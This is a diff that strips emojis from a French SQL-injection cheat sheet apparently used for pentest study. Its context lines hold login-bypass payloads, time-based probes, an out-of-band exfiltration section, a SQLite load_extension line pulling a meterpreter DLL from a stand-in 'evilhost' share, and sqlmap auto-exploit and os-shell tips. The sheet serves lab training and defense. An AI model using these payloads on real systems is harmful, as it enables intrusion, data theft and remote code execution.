@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 💾 Injection SQL (SQLi)
+# Injection SQL (SQLi)
 
 > [!info] **En 1 phrase**
 > SQLi = injecter du code SQL dans une requête en manipulant les **entrées utilisateur** mal filtrées
@@ -22,7 +22,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -34,14 +34,14 @@ flowchart LR
     C --> G[RCE serveur]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Quand l'app concatène l'entrée dans une requête sans **paramétrage**
 > (`SELECT * FROM users WHERE id = $_GET['id']`), on peut "sortir" du champ attendu et
 > **réécrire** le reste de la requête.
 
 ---
 
-## 🕵️ Détection du point d'injection
+## Détection du point d'injection
 
 ```bash
 # Caractères déclencheurs (sur champs string)
@@ -74,9 +74,9 @@ page.asp?id=1' AND SLEEP(5)--   # réponse lente = injectable
 
 ---
 
-## 🏷️ Identification du SGBD (DBMS)
+## Identification du SGBD (DBMS)
 
-> [!tip] 💡 **Première chose à faire** : savoir si on est sur MySQL, MSSQL, PostgreSQL, Oracle ou SQLite.
+> [!tip] **Première chose à faire** : savoir si on est sur MySQL, MSSQL, PostgreSQL, Oracle ou SQLite.
 > Chaque moteur a ses fonctions et sa méthodo. Le mot-clé qui marche = celui du bon SGBD.
 
 ### Keyword based (true/false)
@@ -101,7 +101,7 @@ page.asp?id=1' AND SLEEP(5)--   # réponse lente = injectable
 
 ---
 
-## 🚪 Authentication Bypass
+## Authentication Bypass
 
 ```sql
 -- Requête initiale
@@ -114,7 +114,7 @@ SELECT * FROM users WHERE username = 'user' AND password = 'pass';
 -- Loggé en premier utilisateur (évite les problèmes de résultats multiples)
 ' or 1=1 limit 1 --
 
--- ⚠️ Jamais de payload toujours-vrai sur des endpoints qui suppriment/modifient !
+-- Jamais de payload toujours-vrai sur des endpoints qui suppriment/modifient !
 --    Il peut matcher des sessions, fichiers, configs...
 
 -- Bypass MD5 raw (PHP md5($password, true))
@@ -129,9 +129,9 @@ admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
 
 ---
 
-## 🔗 UNION Based
+## UNION Based
 
-> [!warning] ⚠️ **Règle d'or** : les deux `SELECT` doivent avoir **le même nombre de colonnes**.
+> [!warning] **Règle d'or** : les deux `SELECT` doivent avoir **le même nombre de colonnes**.
 
 ```sql
 -- Requête initiale
@@ -190,7 +190,7 @@ SELECT * FROM mysql.innodb_table_stats;    -- database_name, table_name...
 
 ---
 
-## 💥 Error Based
+## Error Based
 
 ### MySQL
 
@@ -269,7 +269,7 @@ AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||REPLACE(REPLACE((SELECT banner FRO
 
 ---
 
-## 🙈 Blind (boolean / error / time)
+## Blind (boolean / error / time)
 
 ### Boolean based (MySQL)
 
@@ -356,9 +356,9 @@ SELECT * FROM products WHERE product_name LIKE '%user_input%'    -- % = n'import
 
 ---
 
-## 📡 Out-of-Band (OAST)
+## Out-of-Band (OAST)
 
-> [!tip] 💡 **Quand les réponses sont invisibles/instables** : on exfiltre par **DNS/HTTP** vers
+> [!tip] **Quand les réponses sont invisibles/instables** : on exfiltre par **DNS/HTTP** vers
 > un Burp Collaborator ou Interactsh. Utilise `BURP-COLLABORATOR-SUBDOMAIN` comme placeholder.
 
 ```sql
@@ -387,9 +387,9 @@ SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE roo
 
 ---
 
-## 🧱 Stacked Queries (requêtes multiples)
+## Stacked Queries (requêtes multiples)
 
-> [!warning] ⚠️ Non supporté par toutes les BDD/API. **Toujours tester.**
+> [!warning] Non supporté par toutes les BDD/API. **Toujours tester.**
 
 ```sql
 -- MSSQL
@@ -406,7 +406,7 @@ SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
 
 ---
 
-## 🐬 MySQL — fichier & commandes
+## MySQL — fichier & commandes
 
 ```sql
 -- Lire un fichier (nécessite FILE privilege)
@@ -480,7 +480,7 @@ AND MAKE_SET(1,1) AND MAKE_SET(VALUE,(length(version()))=1)
 
 ---
 
-## 🪟 MSSQL — énumération & commandes
+## MSSQL — énumération & commandes
 
 ```sql
 -- Énumération
@@ -567,7 +567,7 @@ SELECT name, password FROM master..sysxlogins           -- MSSQL 2000, hashcat 1
 
 ---
 
-## 🐘 PostgreSQL — fichiers & commandes
+## PostgreSQL — fichiers & commandes
 
 ```sql
 -- Énumération
@@ -622,7 +622,7 @@ SHOW is_superuser; SELECT current_setting('is_superuser');
 
 ---
 
-## 🏺 Oracle — commandes
+## Oracle — commandes
 
 ```sql
 -- Énumération
@@ -699,7 +699,7 @@ odat all -s TARGET -p 1521 -d XE
 
 ---
 
-## 🗄️ SQLite
+## SQLite
 
 > SQLite = base **embarquée** (fichier unique). Pas de fonctions `SLEEP`, pas de requêtes multiples classiques
 > mais des fonctions dédiées (`load_extension`, `writefile`, `ATTACH DATABASE`) très puissantes.
@@ -765,12 +765,12 @@ SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
 -- Compilation côté attaquant : gcc -shared -fPIC evil.c -o evil.so + fichier .dbconfig
 ```
 
-> [!tip] 💡 SQLite = base **locale** (ex: navigateurs, applis mobile, sauvegardes). L'injection y
+> [!tip] SQLite = base **locale** (ex: navigateurs, applis mobile, sauvegardes). L'injection y
 > ouvre souvent l'accès au fichier DB **et** au système de fichiers de la victime.
 
 ---
 
-## 📀 Cassandra
+## Cassandra
 
 > CQL = pas de `OR` booléen dans WHERE, pas de `UNION`, pas de subquery, pas de `SLEEP`.
 > L'angle d'attaque principal = **login bypass** via la syntaxe CQL (`ALLOW FILTERING`) et les commentaires.
@@ -785,12 +785,12 @@ username: admin'/*
 password: */and pass>'
 ```
 
-> [!warning] ⚠️ Injection = beaucoup plus limitée que les autres SGBD : pas d'extraction
+> [!warning] Injection = beaucoup plus limitée que les autres SGBD : pas d'extraction
 > de données par UNION/blind classique, uniquement des bypass de requête par manipulation CQL.
 
 ---
 
-## 🏢 DB2 (IBM DB2 / AS-400)
+## DB2 (IBM DB2 / AS-400)
 
 ### Énumération
 
@@ -842,13 +842,13 @@ SELECT xml2clob(xmelement(name t, table_schema)) FROM sysibm.tables
 SELECT LINE FROM TABLE(QSYS2.IFS_READ_UTF8('/tmp/qsh_output.txt',2147483647,'NONE'))
 ```
 
-> [!tip] 💡 DB2 : tables système par défaut = `SYSIBM`, `SYSCAT`, `SYSSTAT`, `SYSPUBLIC`, `SYSIBMADM`, `SYSTOOLs`.
+> [!tip] DB2 : tables système par défaut = `SYSIBM`, `SYSCAT`, `SYSSTAT`, `SYSPUBLIC`, `SYSIBMADM`, `SYSTOOLs`.
 
 ---
 
 ---
 
-## 🤖 sqlmap — maîtrise
+## sqlmap — maîtrise
 
 ```bash
 # Scan de base
@@ -901,7 +901,7 @@ sqlmap -u "http://x/vuln.php?id=1" --eval="import hashlib;id2=hashlib.md5(id).he
 # Réduire le nombre de tests (rapide sur grosses cibles)
 sqlmap -u "https://x/page.php?cat=demo" -p category --test-filter="Generic UNION query (NULL)"
 sqlmap -u "https://x/page.php?cat=demo" --test-filter="boolean"
-# Crawl + auto-exploit des forms (⚠️ env. contrôlée uniquement !)
+# Crawl + auto-exploit des forms (env. contrôlée uniquement !)
 sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
 ```
 
@@ -954,11 +954,11 @@ def tamper(payload, **kwargs):
     return retVal
 ```
 
-> [!tip] 💡 **Ghauri** (alternative moderne) : `https://github.com/r0oth3x49/ghauri`
+> [!tip] **Ghauri** (alternative moderne) : `https://github.com/r0oth3x49/ghauri`
 
 ---
 
-## 🛡️ WAF Bypass
+## WAF Bypass
 
 ### No space allowed
 
@@ -1028,7 +1028,7 @@ CONCAT(0x75,0x73,0x65,0x72)
 
 ---
 
-## 🧩 Cas particuliers
+## Cas particuliers
 
 ### Second Order SQLi
 
@@ -1069,7 +1069,7 @@ col=%3f%23%00&name=x%60 FROM (SELECT table_name AS `'x` from information_schema.
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -1082,20 +1082,20 @@ col=%3f%23%00&name=x%60 FROM (SELECT table_name AS `'x` from information_schema.
 
 ---
 
-## 🧪 Labs
+## Labs
 
 - PortSwigger Web Security Academy — SQL injection : https://portswigger.net/web-security/all-labs#sql-injection
 - Root-Me : SQL injection (Auth, String, Numeric, Routed, Error, Insert, File reading, Time, Blind, Second Order, Filter bypass, Truncation) : https://www.root-me.org/
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre logique d'attaque**
+> [!tip] **Ordre logique d'attaque**
 > 1. Détecter (`'` → erreur ?) → 2. Identifier le SGBD → 3. Compter les colonnes → 4. UNION ou blind → 5. Dump → 6. FILE/RCE si droits.
 > Toujours essayer **sqlmap en second** (vérifier le manuel d'abord).
 
-> [!warning] ⚠️ **Pièges**
+> [!warning] **Pièges**
 > - `--os-shell` exige `FILE` privilege + dossier web en écriture. Teste d'abord `--file-read=/etc/passwd`.
 > - MSSQL `xp_cmdshell` désactivé par défaut → il faut le réactiver.
 > - Oracle : la plupart des injections fichiers/RCE ne marchent qu'en **stacked query**.
@@ -1105,11 +1105,11 @@ col=%3f%23%00&name=x%60 FROM (SELECT table_name AS `'x` from information_schema.
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- [[SSRF|🌐 SSRF]]
-- [[Injection de commandes|🐚 Injection de commandes]]
-- [[LFI et RFI|📂 LFI / RFI]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md)
+- [[XSS (Cross-Site Scripting)| XSS]]
+- [[SSRF| SSRF]]
+- [[Injection de commandes| Injection de commandes]]
+- [[LFI et RFI| LFI / RFI]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md)
